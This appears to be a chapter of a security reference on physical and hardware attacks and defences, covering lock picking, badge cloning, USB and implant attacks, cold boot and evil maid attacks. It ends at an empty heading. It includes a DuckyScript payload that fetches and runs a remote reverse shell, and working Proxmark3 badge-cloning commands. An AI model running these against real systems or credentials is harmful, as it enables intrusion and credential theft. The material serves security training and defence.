# Domain 17 — Physical and Hardware Security

> **Scope.** Physical security zones: CPTED (Crime Prevention Through Environmental Design), defense-in-depth layering, security perimeters. Lock picking and bypass: pin tumbler mechanics, single-pin picking (SPP), raking, bump keys, disc detainer picks, high-security lock analysis (Medeco, Abloy Protec, ASSA Twin), shims, latch manipulation, under-door tools, hinge attacks. Access control systems: Wiegand protocol weaknesses (plaintext, replay), OSDP v2, ESPKey interception. RFID/NFC badge cloning: Proxmark3, iCopy-X, Flipper Zero, HID iCLASS SE/SEOS, DESFire EV2/EV3. Tailgating: mantrap/airlock design, turnstile types, anti-passback. Surveillance evasion: camera blind spots, IR countermeasures, gait analysis, facial recognition. USB attacks: BadUSB (Rubber Ducky, DuckyScript), USB Armory, O.MG cable, USB kill, USBGuard. Implant devices: Packet Squirrel, Shark Jack, GSM implants, air-gap bridging. Hardware keyloggers: KeyGrabber, AirDrive, wireless exfiltration. Cold boot attack: DRAM remanence, procedure, countermeasures. Evil maid attack: bootloader tampering, TPM measurements, BitLocker pre-boot. TEMPEST/emanation security: Van Eck phreaking, NATO SDIP-27, shielding. Tamper-evident packaging: security seals, tamper mesh, glitter nail polish. Secure facilities: SCIF requirements, ICD 705, Faraday cage, acoustic protection. Social engineering for physical access: impersonation, pretexting, badge manipulation. Supply chain physical interdiction: hardware implant insertion during shipping, detection. Side-channel and fault-injection overview (cross-reference to chapters 17B–17D).

---

## 1. Physical security zones and defense in depth

### 1.1 CPTED — Crime Prevention Through Environmental Design

CPTED applies environmental design principles to reduce criminal opportunity. Four foundational strategies:

**Natural surveillance.** Maximize visibility of public and semi-public areas. Clear sightlines from occupied spaces to entry points. Eliminate blind alcoves, dense shrubbery adjacent to access points, and unmonitored loading docks. Window placement, interior lighting visible from outside, and transparent barriers in lobbies all increase perceived risk for an attacker conducting reconnaissance.

**Natural access control.** Channel foot traffic through defined entry points using landscaping, bollards, fencing, and walkway design. Reduce the number of access paths to critical areas. Every additional uncontrolled entrance multiplies the attack surface. A single monitored entrance with badge access is orders of magnitude more defensible than six unrestricted doors.

**Territorial reinforcement.** Define ownership of space through signage, pavement markings, fencing grades, and landscaping transitions. The psychological boundary between public and private space deters casual intrusion. Graduated cues — public sidewalk, marked parking, badge-access perimeter, escorted interior — establish escalating commitment for an unauthorized person.

**Maintenance.** Broken windows theory applied to facility security. Degraded infrastructure (broken lights, propped-open doors, disabled alarms) signals that violations are tolerated. Rigorous maintenance of physical controls is a security control in itself.

### 1.2 Defense-in-depth layers

Physical security follows concentric zones, each requiring separate authorization to penetrate:

| Zone | Description | Controls |
|------|-------------|----------|
| **Zone 0 — Perimeter** | Property boundary, parking areas | Fencing, bollards, lighting, CCTV, vehicle barriers |
| **Zone 1 — Building envelope** | Exterior walls, entrances, loading docks | Reinforced doors, access control, visitor management, guard post |
| **Zone 2 — Common areas** | Lobbies, hallways, break rooms | Badge readers, cameras, motion sensors |
| **Zone 3 — Restricted areas** | Server rooms, labs, offices with sensitive data | Biometric + badge, mantraps, CCTV with recording |
| **Zone 4 — High-security vaults** | SCIFs, crypto storage, evidence rooms | Multi-factor (badge + biometric + PIN), Faraday shielding, IDS, 24/7 monitoring |

Each zone boundary requires independent authentication. Compromise of one zone's controls should not grant access to inner zones. Cabling, HVAC ducts, and drop ceilings crossing zone boundaries are common bypass vectors — they must be secured with physical barriers, sensors, or both.

---

## 2. Lock picking and lock bypass

### 2.1 Pin tumbler lock mechanics

The pin tumbler lock (Yale-type) is the most common lock mechanism worldwide. A cylindrical plug rotates inside a shell (housing). A series of pin stacks (typically 5–6 for residential, up to 7 for commercial) span the plug-shell boundary. Each pin stack consists of a **key pin** (bottom, varying height) and a **driver pin** (top, uniform height), separated by the **shear line** at the plug-shell interface. Springs above the driver pins push the stacks downward.

When the correct key is inserted, each key pin is pushed to exactly the height where the junction between key pin and driver pin aligns with the shear line. All stacks aligned simultaneously allows the plug to rotate. An incorrect key leaves at least one stack with the junction above or below the shear line, blocking rotation.

### 2.2 Single-pin picking (SPP)

The most precise lock-picking technique. The attacker applies light rotational pressure to the plug using a **tension wrench** (also called a tension tool or turning tool), then manipulates each pin individually with a **pick** (typically a hook pick — short, medium, or deep hook depending on keyway profile).

**Procedure:**

1. Insert tension wrench at the bottom or top of the keyway. Apply light rotational pressure in the direction the key turns.
2. Due to manufacturing tolerances, one pin stack binds first — the plug's slight rotation under tension causes one pin column to bind tighter than the others.
3. Lift the binding pin with the hook pick until a tactile click is felt — the driver pin crosses the shear line and the plug rotates slightly further.
4. A new pin now becomes the binding pin. Repeat until all pins are set.
5. The plug rotates fully, opening the lock.

**Key skill:** Tension control. Too much tension causes multiple pins to bind simultaneously (false set). Too little tension causes set pins to drop back. The attacker must sense which pin is binding through tactile feedback transmitted through the tension wrench and pick.

### 2.3 Raking

A faster, less precise technique. A **rake pick** (snake rake, Bogota rake, city rake) is inserted fully into the keyway and rapidly moved in and out while applying intermittent tension. The randomized contact with multiple pins simultaneously bounces some into the correct position. Raking trades reliability for speed — effective against low-security pin tumblers with loose tolerances, largely ineffective against locks with security pins.

### 2.4 Bump keys

A bump key is cut to the maximum depth on all pin positions. The attacker inserts the bump key one pin-position short of full insertion, applies light tension, then strikes the key's bow with a bump hammer (or the handle of a screwdriver). The kinetic energy transfers through the key pins to the driver pins, momentarily separating all pin stacks at the shear line. Applied tension rotates the plug during the brief moment of separation.

**Detection indicators:** Bump attacks leave minimal forensic evidence. Possible indicators: minor scratching on the keyway's warding surfaces, slight deformation of the key pin tips over repeated bumping.

### 2.5 Security pins and countermeasures

High-security locks use modified pin shapes to resist picking:

| Pin Type | Mechanism | Effect on Picking |
|----------|-----------|-------------------|
| **Spool pins** | Hourglass-shaped driver pin | Creates false set — plug rotates partially, then stops. Requires counter-rotation to set. |
| **Serrated pins** | Multiple grooves on driver pin | Creates multiple false sets at each serration level. |
| **Mushroom pins** | T-shaped driver pin head | Similar to spool — catches at shear line, resists being pushed past. |
| **Medeco biaxial** | Key pins rotated on axis + sidebar | Pins must be lifted AND rotated to correct angle. Sidebar must align. Two independent mechanisms. |
| **Abloy Protec** | Disc detainer with DPS (Disc Protection System) | Rotating discs, not pin stacks. No springs. Requires specialized disc detainer picks. |
| **ASSA Twin** | Pin tumbler + sidebar with finger pins | Dual locking: standard pin tumbler plus independent sidebar requiring separate key cuts. |

### 2.6 Disc detainer locks

Instead of spring-loaded pin stacks, disc detainer locks (Abloy, Kryptonite) use a series of rotating discs, each with a slot (true gate) that must align with a sidebar. The correct key rotates each disc to the precise angle where all true gates align, allowing the sidebar to retract and the plug to turn.

**Picking disc detainers:** Requires a specialized disc detainer pick (e.g., Sparrows Disc Detainer Pick, original design by LockPickingLawyer). The pick has a tensioning element (simulating key rotation) and a thin pick tip that individually rotates each disc to find its true gate. False gates (decoy slots at incorrect angles) create misleading feedback.

### 2.7 Pick tools and equipment

| Tool | Manufacturer | Type | Price Range (USD) |
|------|-------------|------|-------------------|
| Sparrows Spirit Set | Sparrows | Hook/rake set, TOK/BOK wrenches | $35–50 |
| Peterson GSP Ghost Set | Peterson | Government steel picks, premium | $80–120 |
| Multipick Elite Set | Multipick | German precision picks | $150–250 |
| Sparrows Disc Detainer Pick | Sparrows | Disc detainer specific | $40–60 |
| Covert Instruments Quad Set | Covert Instruments | Compact bypass set | $25–40 |
| Bump key set (multiple profiles) | Various | Bump keys for common keyways | $20–40 |
| Electric pick gun (Dino, Klom) | Various | Motorized single-pin vibration | $40–150 |

### 2.8 Lock bypass techniques

Bypass circumvents the locking mechanism entirely rather than manipulating it:

**Shims.** Thin metal strips inserted between the shackle and lock body of padlocks to depress the latch mechanism. Effective against spring-loaded shackle retention. Defeated by ball-bearing locking (shackle locked by a rotating ball that cannot be shimmed).

**Latch manipulation.** Credit-card shimming of spring-loaded door latches (loiding). Insert a flexible shim between the door frame and the latch bolt to push the angled latch back into the door. Defeated by deadbolt locks (no angled surface) and latch guards (metal plates blocking shim insertion).

**Under-door tools.** A flexible tool (typically a rod with a lever) slid under the door gap to reach the interior handle or push-bar. The tool hooks the handle from inside and pulls it down, opening the door. Effective against outward-opening doors with lever handles. Countered by: door sweeps eliminating the gap, interior handle shields, and panic bars that require push (not pull) action.

**Hinge removal.** On doors with exposed hinges (hinges on the exterior/attacker side), removing the hinge pins allows the door to be pulled open from the hinge side. Countered by: security hinge pins (non-removable pins, set screws), hinge studs (interlocking pins that prevent separation even with hinge pins removed), and placing hinges on the interior side.

---

## 3. Access control systems

### 3.1 Wiegand protocol

The Wiegand interface is the dominant wiring standard between card readers and access control panels. A card reader reads the credential (RFID badge, PIN, biometric) and transmits the credential data to the controller over two data lines (DATA0 and DATA1) using the Wiegand protocol.

**Critical vulnerability: Wiegand transmits credentials in plaintext with no encryption, no authentication, and no integrity protection.** The protocol was designed in the 1980s for wired connections inside controlled conduit — no adversarial model was considered.

**Wiegand 26-bit format (most common):**

```
| 1 bit even parity | 8 bit facility code | 16 bit card number | 1 bit odd parity |
```

The total credential space: 256 facility codes x 65,536 card numbers. The parity bits provide minimal error detection, not security.

**Attack vectors:**

- **Eavesdropping.** Wiegand signals are TTL-level pulses. Any device with digital inputs connected to DATA0/DATA1 wires captures every credential presented. Physical access to the wiring (often in the wall behind the reader, or in the ceiling above) is sufficient.
- **Replay.** Captured credential data replayed on DATA0/DATA1 lines is accepted by the controller identically to a legitimate card presentation.
- **Brute force.** The 24-bit credential space (facility + card number) is small enough to enumerate. At one attempt per second, full enumeration takes ~4.6 hours for a single facility code.

### 3.2 ESPKey — Wiegand interception device

The **ESPKey** is an open-source ESP8266/ESP32-based device designed to intercept and replay Wiegand credentials. It connects inline between the card reader and the access control panel on the DATA0/DATA1 wires.

**Capabilities:**

- Passively logs all credential presentations (card number, facility code, timestamp)
- Replays captured credentials on demand (via WiFi web interface or API)
- Injects arbitrary Wiegand data to the controller
- Powered parasitically from the reader's 12V supply

**Installation:** The device is physically small (fits behind the reader faceplate or inside the wall box). An attacker with brief physical access to the reader wiring (2–5 minutes) installs the ESPKey inline. It then operates autonomously, logging credentials over WiFi.

```
# ESPKey default WiFi AP: ESPKey_XXXX
# Web interface: http://192.168.4.1
# Logged credentials visible in web UI
# Replay: select credential → click "Send"
```

### 3.3 OSDP v2 — Secure alternative

**Open Supervised Device Protocol (OSDP) v2** (SIA standard) addresses Wiegand's deficiencies:

- **AES-128 encryption** of all communication between reader and controller (Secure Channel Protocol — SCP)
- **Bidirectional communication** — controller can query reader status, update firmware, manage keys
- **Tamper supervision** — reader reports tamper events to controller
- **RS-485 physical layer** — multi-drop bus, longer cable runs (up to 1200m vs Wiegand's ~150m)

**Migration barrier:** Most installed access control infrastructure uses Wiegand. Replacing every reader-to-panel connection requires rewiring or reader/panel replacement. Many organizations continue operating Wiegand systems despite known vulnerabilities.

---

## 4. RFID and NFC badge cloning

### 4.1 Low-frequency (125 kHz) credentials

Legacy systems (HID ProxCard II, EM4100, AWID, Indala) operate at 125 kHz. These cards transmit a static, unencrypted ID number when energized by the reader's RF field. No authentication, no challenge-response, no encryption. Cloning is trivial.

**Proxmark3 — 125 kHz cloning:**

```bash
# Read an HID Prox card
proxmark3> lf hid read
# Output: TAG ID: 2004263f9e (H10301) FC: 123 CN: 45678

# Clone to a T5577 writable card
proxmark3> lf hid clone --r 2004263f9e

# Read an EM4100 card
proxmark3> lf em 410x read
# Output: EM410x ID: 1A2B3C4D5E

# Clone EM4100 to T5577
proxmark3> lf em 410x clone --id 1A2B3C4D5E
```

**Flipper Zero — 125 kHz:**

The Flipper Zero's RFID module reads and emulates 125 kHz cards natively. Navigate to `125 kHz RFID → Read`, present the card, then `Saved → Emulate`. The Flipper emulates the card's signal using its built-in coil. Limited by the coil's small size (shorter read/emulate range than a Proxmark3 with a full-size antenna).

**iCopy-X:** A dedicated badge cloner with integrated reader and writer. Reads the source card, identifies the format automatically, and writes to a blank T5577 card in one device. Designed for speed — a non-technical operator can clone a badge in under 10 seconds.

### 4.2 High-frequency (13.56 MHz) credentials

Modern access control uses 13.56 MHz smartcards with varying levels of cryptographic protection:

| Card Type | Crypto | Cloning Difficulty | Notes |
|-----------|--------|-------------------|-------|
| **MIFARE Classic 1K/4K** | Crypto-1 (broken) | Easy — key recovery in seconds | Crypto-1 broken by Courtois (2008). Proxmark3 `hf mf autopwn` recovers all sector keys. |
| **MIFARE DESFire EV1** | 3DES/AES | Moderate — requires key knowledge | Secure if keys are diversified. Default keys on poorly configured systems are exploitable. |
| **MIFARE DESFire EV2/EV3** | AES-128 + CMAC | Hard — requires key compromise | Mutual authentication. Secure when properly implemented. |
| **HID iCLASS** | 3DES (legacy key leaked) | Easy — master key is public | HID's legacy master key was extracted and published. Proxmark3 reads all iCLASS Standard credentials. |
| **HID iCLASS SE/SEOS** | AES-128, SCP03 | Hard — secure element backed | SE processor performs crypto on-card. No known practical cloning attack on correctly configured SEOS. |
| **NXP NTAG series** | None (NTAG213/215/216) | Trivial — no crypto | UID-only authentication is easily cloned. |

**Proxmark3 — MIFARE Classic full key recovery and clone:**

```bash
# Automatic key recovery (exploits Crypto-1 weaknesses)
proxmark3> hf mf autopwn

# Dump all sectors after key recovery
proxmark3> hf mf dump

# Write dump to a blank MIFARE Classic card (Magic UID card — Gen1a/Gen2)
proxmark3> hf mf cload -f dump.bin

# For UID-locked readers: use Gen2/CUID card (responds to normal commands, writable UID)
proxmark3> hf mf csetuid --uid AABBCCDD
```

**Proxmark3 — iCLASS legacy read:**

```bash
# Read iCLASS Standard (uses the published HID master key)
proxmark3> hf iclass read

# Dump full card
proxmark3> hf iclass dump --ki 0
# ki 0 = default/legacy key
```

### 4.3 Long-range RFID skimming

Covert badge reading at distance. Standard access control readers operate at 5–10 cm read range. Custom high-power reader antennas extend the range:

- **125 kHz:** Covert reader with amplified antenna and larger coil can read Prox cards at 30–60 cm (belt-clip distance while walking past). Demonstrated at DEF CON by Fran Brown (Bishop Fox) with a custom long-range reader concealed in a backpack.
- **13.56 MHz:** Range extension is more limited due to near-field coupling physics. Practical covert reads at 15–25 cm with optimized antenna geometry.

**Detection:** Monitor for unusual RF field strength near readers. RFID shielding sleeves/wallets block unauthorized reads. DESFire EV2/EV3 with mutual authentication prevents credential theft even if the RF communication is intercepted (the cloned UID alone is insufficient without the symmetric keys).

---

## 5. Tailgating, piggybacking, and anti-passback

### 5.1 Tailgating mechanics

Tailgating: an unauthorized person follows an authorized person through a controlled access point before the door closes. Piggybacking: the authorized person knowingly holds the door for the unauthorized person (social compliance — holding the door is polite).

**Attack success rate:** Studies at corporate facilities show >50% tailgating success rate at standard badge-access doors during peak entry times (morning arrival, lunch). Social norms strongly favor holding doors, and most employees will not challenge someone who appears to belong.

### 5.2 Mantrap (airlock) design

A mantrap is a small vestibule with two interlocked doors — only one door can be open at a time. Entry sequence: present badge at outer door, enter mantrap, outer door closes and locks, present badge at inner door. If the inner badge presentation fails or if occupancy sensors detect more than one person, the mantrap locks both doors and alerts security.

**Key specifications:**

- Interior dimensions: minimum 1.2m x 1.2m for single-person, 1.5m x 1.5m for ADA compliance
- Occupancy sensing: weight-sensitive floor (load cell), overhead stereo camera with person counting, lidar-based volumetric sensing, infrared beam-break arrays
- Anti-piggybacking: reject entry if more than one person detected
- Materials: bullet-resistant glass (UL 752 Level 3 minimum for high-security), steel-reinforced door frames

### 5.3 Turnstile types

| Type | Anti-tailgating Effectiveness | Throughput | Notes |
|------|-------------------------------|------------|-------|
| **Waist-high tripod** | Low — can be stepped over or pushed through | High (25–30 ppm) | Deterrent only. Not a security barrier. |
| **Full-height turnstile** | High — physical barrier floor to ceiling | Medium (15–20 ppm) | Effective for exterior perimeters. |
| **Optical speed gate** | Medium — detects but cannot physically prevent | Very high (40+ ppm) | Beam-break sensors detect unauthorized passage. Alarm-based, not barrier-based. |
| **Security revolving door** | Very high — single-occupancy, interlocked | Low (8–12 ppm) | Combines mantrap concept with turnstile. Weighing platform in floor. |

### 5.4 Anti-passback

Anti-passback prevents a badge from being used to enter a zone if it has not first been recorded exiting. Prevents badge sharing (user badges in, hands badge back through the door to another person). Requires readers on both entry and exit points. **Hard anti-passback:** second entry denied at the reader. **Soft anti-passback:** second entry logged and alarmed but not denied (avoids lockout situations).

---

## 6. Surveillance systems and evasion

### 6.1 Camera placement and blind spots

Standard CCTV installations prioritize coverage of entries/exits, parking areas, and high-value zones. Common blind spots:

- Directly beneath dome cameras (cone of silence — the camera cannot look straight down at its mounting surface)
- Corners behind camera mounting position (camera FOV typically 90–120 degrees; areas behind the mount are unmonitored)
- Transition zones between camera coverage areas (seams)
- Areas obscured by structural elements (columns, HVAC equipment, signage)

**Reconnaissance:** A physical penetration tester maps camera positions, identifies models (zoom capability, PTZ vs fixed), and determines coverage gaps by observing camera angles and movement patterns. PTZ (pan-tilt-zoom) cameras create dynamic blind spots — when the camera is panned to one area, other areas are temporarily unmonitored.

### 6.2 IR LED countermeasures

Most security cameras use IR illumination for night vision. An array of high-power IR LEDs (850 nm or 940 nm) mounted on a hat brim or glasses frame floods the camera sensor with IR light, causing the face to appear as a bright white blob — obscuring facial features. 940 nm LEDs are invisible to the human eye; 850 nm emits a faint red glow.

**Limitations:** Effective only against cameras using IR-sensitive sensors (most CCTV). Ineffective against cameras operating in visible light with adequate ambient illumination. Some modern cameras use IR-cut filters that switch between day/night modes, reducing effectiveness during daytime operation.

### 6.3 Facial recognition countermeasures

- **CV Dazzle (Adam Harvey):** Geometric face paint patterns that disrupt face-detection algorithms by breaking the expected symmetry and feature patterns that cascade classifiers (Viola-Jones) and CNN-based detectors rely on. Effectiveness is model-dependent and degrades against newer detection architectures trained on adversarial examples.
- **Adversarial patches:** Printed patterns (on clothing, hats, or accessories) designed to trigger misclassification in specific neural network architectures. Highly model-specific — a patch adversarial to YOLOv5 may not affect FaceNet.
- **Practical considerations:** Both approaches are conspicuous. In an operational physical penetration test, blending in (appropriate clothing, confident demeanor, carried clipboard/laptop) is typically more effective than technical countermeasures that draw attention.

### 6.4 Gait analysis

Gait recognition systems identify individuals by walking pattern — stride length, cadence, hip rotation, arm swing. Used as a secondary biometric in high-security surveillance. Countermeasures: altering gait (gravel in shoe, knee brace, carrying asymmetric load) can defeat some algorithms but is difficult to sustain naturally. Research-grade systems using deep learning on skeleton-pose estimation are increasingly resistant to simple gait modification.

---

## 7. USB-based attacks

### 7.1 BadUSB and HID injection

USB Human Interface Device (HID) attacks exploit the fact that operating systems automatically trust USB keyboards. A microcontroller programmed as a USB HID device types pre-scripted commands at machine speed when plugged in.

**Hak5 USB Rubber Ducky:** The canonical HID attack platform. Uses **DuckyScript** — a simple scripting language compiled to a binary payload loaded on a micro SD card.

```
REM Open PowerShell and download reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')
ENTER
```

**DuckyScript key commands:** `STRING` (type text), `DELAY` (milliseconds), `GUI` (Windows key), `ENTER`, `ALT`, `CTRL`, `SHIFT`, `REM` (comment), `REPEAT` (repeat last command). Compiled with `duckencoder.jar` or the Hak5 web encoder.

**Execution speed:** The Rubber Ducky types at ~1000 characters/second. A full reverse-shell payload executes in under 3 seconds from insertion.

### 7.2 O.MG Cable

A USB cable with an embedded WiFi-enabled microcontroller (ESP8266-based). Visually indistinguishable from a standard USB-A/USB-C/Lightning cable. The operator connects to the cable's WiFi AP and triggers HID payloads remotely, exfiltrates keylogged data, or deploys payloads at a chosen moment.

**Capabilities:** HID injection (DuckyScript compatible), keystroke logging (when used as a charging/data cable, logs all keystrokes from the connected keyboard), WiFi command-and-control, geofencing triggers (payload executes only when the device connects to a specific WiFi network), self-destruct (wipe payload on command).

**Models:** O.MG Cable (USB-A), O.MG Cable Elite (USB-C, keystroke logging, increased storage), O.MG Plug (USB-A plug form factor, no cable). Price range: $120–$180.

### 7.3 USB Armory

An open-source USB computer (Inverse Path/WithSecure) the size of a USB stick. Runs a full Linux OS (i.MX6UL SoC, 512MB RAM). Use cases in physical penetration testing:

- **Network implant:** Emulates a USB Ethernet adapter, performs MITM on the host's network traffic via USB networking
- **HID attack platform:** Programmable in any language (not limited to DuckyScript)
- **Encrypted storage:** Hardware-encrypted portable filesystem
- **HSM (Hardware Security Module):** Runs INTERLOCK — an authenticated encryption file-transfer application

### 7.4 USB Kill

A device that charges its capacitors from the USB port's 5V supply, then discharges -200V DC back into the USB data lines, destroying the USB controller and often the motherboard. Purely destructive — no data exfiltration.

**Versions:** USB Kill v4 (multiple discharge cycles, defeats crowbar protection on some ports). Countermeasure: USB port optoisolation, Zener diode clamping circuits, or USB data blockers (charge-only cables that disconnect data pins).

### 7.5 USBGuard — Linux defense

USBGuard is a Linux framework for USB device authorization policy enforcement. It implements a whitelist/blacklist policy for USB devices based on device attributes (VID, PID, serial number, device class).

```bash
# Install USBGuard
sudo apt install usbguard

# Generate initial policy from currently connected devices
sudo usbguard generate-policy > /etc/usbguard/rules.conf

# Block all new USB HID devices by default
# In /etc/usbguard/rules.conf:
# reject with-interface equals { 03:*:* }

# List currently connected USB devices
sudo usbguard list-devices

# Allow a specific device
sudo usbguard allow-device <device-id>

# Block a specific device
sudo usbguard block-device <device-id>
```

**Policy rule format:** `allow|block|reject id <VID>:<PID> serial "<serial>" via-port "<port>" with-interface <class>:<subclass>:<protocol>`

On Windows, Group Policy can restrict USB device installation by device class (GUID), but lacks USBGuard's granularity. Third-party EDR solutions (CrowdStrike, SentinelOne) provide USB device control on Windows and macOS.

---

## 8. Implant devices

### 8.1 Network implants

Covert devices placed on a target network to provide persistent remote access.

**Hak5 Packet Squirrel Mark II:** An inline Ethernet implant. Installed between a network device (printer, IP phone, workstation) and the network port. Transparent to the network — passes traffic while providing SSH access and packet capture via an integrated cellular or WiFi uplink. Payloads are bash scripts on a USB drive.

```bash
# Packet Squirrel payload example: tcpdump capture to USB
#!/bin/bash
LED SETUP
NETMODE BRIDGE
LED ATTACK
tcpdump -i br-lan -w /mnt/udisk/capture.pcap &
LED FINISH
```

**Hak5 Shark Jack:** A pocket-sized network attack tool. Plugs into an Ethernet port, auto-runs payloads (nmap scanning, credential harvesting, payload delivery). Battery-powered, operates autonomously for 10–15 minutes.

**LAN Turtle:** USB Ethernet adapter form factor. Plugs into a workstation's USB port, provides the host with a network connection while maintaining a covert reverse-SSH tunnel to the attacker's C2 server.

### 8.2 GSM/cellular implants

A miniature cellular modem (SIM-based, 4G/LTE) connected to the target network via Ethernet or WiFi. The implant establishes an outbound cellular data connection to the attacker's C2, bypassing all corporate network monitoring. Detection is difficult because the traffic never traverses the corporate network — it exits via the cellular network directly.

**Countermeasures:** RF spectrum monitoring (detect unauthorized cellular transmitters inside the facility), periodic physical inspection of network infrastructure (follow every cable, inspect every device), network port security (802.1X port-based NAC — unauthorized devices cannot authenticate to the switch port).

### 8.3 Air-gap bridging

Bridging air-gapped networks (networks with no network connectivity to untrusted networks) requires physical implant devices that exfiltrate data via non-network channels:

- **RF exfiltration:** Miniature software-defined radio (SDR) transmitters that modulate stolen data onto RF signals receivable by a nearby receiver. Research demonstrations (Ben-Gurion University AirHopper, USBee, MOSQUITO) have shown data exfiltration via FM radio signals generated by USB data bus manipulation, electromagnetic emanations from display cables, and speaker-to-microphone ultrasonic channels.
- **Optical exfiltration:** Malware blinks a hard-drive LED or screen pixels in patterns decodable by a camera with line-of-sight (LED-it-GO, VisiSploit).
- **Acoustic:** Ultrasonic data transmission between compromised air-gapped machines via speakers and microphones (Fansmitter uses CPU fan speed modulation).

All air-gap bridging attacks require initial malware deployment on the air-gapped machine (via supply chain compromise, insider, or removable media) plus a receiver within range of the covert channel.

---

## 9. Hardware keyloggers

### 9.1 Inline hardware keyloggers

Devices installed between a keyboard and the computer, logging all keystrokes to internal flash memory.

| Device | Form Factor | Storage | Exfiltration | Price (USD) |
|--------|-------------|---------|-------------|-------------|
| **KeyGrabber USB** | USB-A inline dongle | 2–16 GB | Physical retrieval (remove device, read storage) | $40–100 |
| **AirDrive Forensic Keylogger** | USB-A inline, miniaturized | 8–16 GB | WiFi (device creates AP, attacker retrieves logs wirelessly) | $100–170 |
| **KeyGrabber Nano** | Miniaturized USB-A | 2 GB | Physical retrieval | $40–60 |
| **KeyGrabber Pico** | Internal (soldered to keyboard PCB) | 4 GB | Physical retrieval | $80–120 |

**WiFi-enabled keyloggers** (AirDrive) are particularly dangerous — the attacker installs the device once and retrieves keystrokes remotely without returning to the physical location.

### 9.2 Detection methods

- **Visual inspection:** Check the USB cable path from keyboard to computer. Any unexpected inline device is suspect. Challenging with miniaturized devices that resemble cable adapters.
- **USB device enumeration:** Hardware keyloggers appear as a USB hub + keyboard combination. An unexpected USB hub in the device tree is an indicator. `lsusb -t` on Linux shows the device topology.
- **Electrical characteristics:** Time-Domain Reflectometry (TDR) on the USB cable detects impedance changes caused by inline devices. Specialized but effective.
- **Endpoint security:** USBGuard policies that reject unexpected USB hubs or secondary HID devices.

```bash
# Linux: check USB device tree for unexpected hubs/HID devices
lsusb -t
# Look for unexpected hub + keyboard chains:
# /:  Bus 01.Port 1: Dev 1, Class=root_hub
#     |__ Port 2: Dev 5, Class=Hub     <-- unexpected hub = keylogger
#         |__ Port 1: Dev 6, Class=HID  <-- keyboard behind hub
```

---

## 10. Cold boot attack

### 10.1 DRAM remanence

DRAM cells retain their charge for a period after power is removed. At room temperature, data persists for seconds to minutes. Cooling the DRAM modules (compressed air duster inverted to spray refrigerant, or liquid nitrogen) extends retention to minutes or hours. This enables extraction of encryption keys, passwords, and other sensitive data from memory after the machine is powered off or rebooted.

### 10.2 Attack procedure

1. **Target identification:** Machine must be running (or recently running) with sensitive data in memory — full-disk encryption keys (BitLocker, LUKS, FileVault), authentication tokens, cryptographic material.
2. **Cooling:** Spray DRAM modules with compressed air (inverted can — produces cold spray at approximately -40°C) or apply canned freeze spray (component cooler). Cooling must occur while the machine is still powered (or within seconds of power-off).
3. **Reboot to attack OS:** Hard-reboot the machine (power cycle) and immediately boot from a USB drive running a memory-imaging tool (e.g., `msramdmp`, `bios_memimage`, or a custom Linux initrd that dumps `/dev/mem` to USB).
4. **Memory image acquisition:** The attack OS dumps physical memory to storage before the residual data decays.
5. **Key extraction:** Analyze the memory dump for cryptographic key structures. Tools: `aeskeyfind` (searches for AES key schedules in memory dumps), `rsakeyfind` (RSA private keys), `findaes`. BitLocker key recovery from memory dumps is well-documented (Princeton/EFF research, 2008).

```bash
# Search memory dump for AES key schedules
aeskeyfind memdump.bin
# Output: candidate AES-256 keys found at offset 0x1A3F0000

# Search for RSA keys
rsakeyfind memdump.bin
```

### 10.3 Countermeasures

- **Memory encryption:** AMD SME/SEV (Secure Memory Encryption / Secure Encrypted Virtualization) encrypts DRAM contents with a hardware key. Intel TME (Total Memory Encryption). Cold boot yields encrypted data, not plaintext keys.
- **Memory scrubbing on shutdown/reboot:** The OS overwrites encryption keys in memory before shutdown. Effective only for graceful shutdown — defeated by hard power-off (which is the attack scenario).
- **Full-memory encryption at boot:** BitLocker with TPM + PIN (PIN required at pre-boot, key not loaded into memory until PIN is entered). LUKS with `--perf-no_read_workqueue --perf-no_write_workqueue` and kernel patches for key scrubbing.
- **Physical countermeasures:** Epoxy over DRAM modules (prevents removal for transplant to another board), case intrusion detection (tamper switch triggers key zeroization), DRAM soldered to motherboard (prevents chip-off transplant).
- **Chassis tamper detection:** Triggering memory erasure on case opening. TPM-measured boot detects if the boot chain was altered (cold boot OS injection).

---

## 11. Evil maid attack

### 11.1 Attack mechanism

An attacker with brief physical access to an unattended machine modifies the boot chain to capture the user's decryption passphrase or inject persistent malware. Named for the hotel-room threat model — a maid (or adversary) accesses the laptop while the owner is away.

### 11.2 Attack procedure

1. Boot from external media (USB/PXE).
2. Modify the bootloader (GRUB, Windows Boot Manager) to include a keylogger that captures the FDE passphrase at next boot.
3. Alternatively: replace the bootloader entirely with a malicious one that displays a convincing passphrase prompt, captures the passphrase, stores it, then reboots to the legitimate bootloader.
4. The user returns, boots the machine, enters the passphrase (captured by the malicious bootloader), and proceeds normally. The attacker returns later to retrieve the captured passphrase.

### 11.3 Detection and countermeasures

- **UEFI Secure Boot:** Prevents unsigned bootloaders from executing. The malicious bootloader must be signed by a key in the UEFI db, or the attacker must disable Secure Boot (which is detectable — TPM PCR values change).
- **TPM-measured boot:** The TPM extends PCR values with hashes of each boot stage. If the bootloader is modified, PCR values change, and TPM-sealed secrets (including FDE keys sealed to expected PCR values) are not released. BitLocker + TPM unseals the volume encryption key only if the measured boot chain matches the expected values.
- **Intel Boot Guard:** Hardware-rooted verified boot. The CPU verifies the initial boot block against a key hash burned into CPU fuses. Bootloader replacement is detected before execution.
- **Anti-tamper tape/seals:** Tamper-evident stickers over laptop screws and port covers. An attacker must remove them to access the disk or boot from USB. Does not prevent the attack but increases detection probability if the user inspects the seals.
- **Pre-boot authentication displayed information:** Some FDE implementations display a hash or image selected during setup. If the malicious bootloader cannot reproduce this verification element, an alert user notices.

---

## 12. TEMPEST and emanation security

### 12.1 Van Eck phreaking

Electronic equipment emits electromagnetic radiation correlated with its internal signals. Wim van Eck demonstrated (1985) that CRT monitor images could be reconstructed from EM emanations at a distance using a wideband receiver and signal processing. Modern research extends this to:

- **LCD monitors:** Video signal emanations from display cables (HDMI, DisplayPort, VGA). Demonstrated reconstruction of screen content from emanations at 3–10 meters with directional antennas and SDR receivers.
- **Keyboards:** Electromagnetic emanations from keyboard matrix scanning and USB/PS2 data lines. Each keystroke produces a characteristic EM signature. Demonstrated keystroke recovery at distances up to 20 meters (Martin Vuagnoux and Sylvain Pasini, USENIX Security 2009).
- **Network cables:** Unshielded Ethernet cables emit EM radiation correlated with transmitted data.

### 12.2 TEMPEST standards

